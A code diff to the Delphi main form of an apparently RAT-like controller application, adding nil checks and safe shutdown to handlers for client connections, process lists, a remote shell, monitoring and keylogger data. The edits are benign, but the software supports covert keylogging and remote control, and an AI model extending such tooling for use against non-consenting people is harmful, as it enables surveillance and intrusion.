@@ -119,7 +119,11 @@ end;
 
 procedure TForm1.BeforeDestruction;
 begin
-  FServerManager.Free;
+  if Assigned(FServerManager) then
+  begin
+    FServerManager.Stop;
+    FreeAndNil(FServerManager);
+  end;
   inherited;
 end;
 
@@ -132,6 +136,7 @@ end;
 
 procedure TForm1.OnServerLog(Category: TLogCategory; const Msg: string);
 begin
+  if not Assigned(FServerManager) then Exit;
   case Category of
     lcConnection: if ToggleSwitch1.State = tssOff then Exit;
     lcCommand   : if ToggleSwitch2.State = tssOff then Exit;
@@ -356,6 +361,7 @@ procedure TForm1.OnClientConnected(const Info: TClientInfo);
 var
   LatestInfo: TClientInfo;
 begin
+  if not Assigned(FServerManager) then Exit;
   if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
     AddOrUpdateListView(LatestInfo)
   else
@@ -368,6 +374,7 @@ procedure TForm1.OnClientUpdated(const Info: TClientInfo);
 var
   LatestInfo: TClientInfo;
 begin
+  if not Assigned(FServerManager) then Exit;
   if FServerManager.TryGetClientInfo(Info.LineHandle, LatestInfo) then
     AddOrUpdateListView(LatestInfo)
   else
@@ -376,6 +383,7 @@ end;
 
 procedure TForm1.OnClientDisconnected(aLine: TncLine);
 begin
+  if not Assigned(FServerManager) then Exit;
   RemoveFromListView(aLine);
   TThread.Queue(nil, procedure begin UpdateStatusBar; end);
   FServerManager.UnregisterInfoForm(aLine);
@@ -389,6 +397,7 @@ procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
   F3: TForm3;
 begin
+  if not Assigned(FServerManager) then Exit;
   F3 := FServerManager.GetInfoForm(aLine);
   if Assigned(F3) then
     F3.HandleInfoJSON(JSONObj);
@@ -398,6 +407,7 @@ procedure TForm1.OnProcessReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
   F4: TForm4;
 begin
+  if not Assigned(FServerManager) then Exit;
   F4 := FServerManager.GetProcessForm(aLine);
   if Assigned(F4) then
     F4.HandleProcessJSON(JSONObj);
@@ -407,6 +417,7 @@ procedure TForm1.OnRemoteShellReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
   F5: TForm5;
 begin
+  if not Assigned(FServerManager) then Exit;
   F5 := FServerManager.GetRemoteShellForm(aLine);
   if Assigned(F5) then
     F5.HandleShellJSON(JSONObj);
@@ -416,6 +427,7 @@ procedure TForm1.OnMonitoringReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
   F6: TForm6;
 begin
+  if not Assigned(FServerManager) then Exit;
   F6 := FServerManager.GetMonitoringForm(aLine);
   if Assigned(F6) then
     F6.HandleMonitoringJSON(JSONObj);
@@ -425,6 +437,7 @@ procedure TForm1.OnKeyloggerReceived(aLine: TncLine; JSONObj: TJSONObject);
 var
   F7: TForm7;
 begin
+  if not Assigned(FServerManager) then Exit;
   F7 := FServerManager.GetKeyloggerForm(aLine);
   if Assigned(F7) then
     F7.HandleKeyloggerJSON(JSONObj);
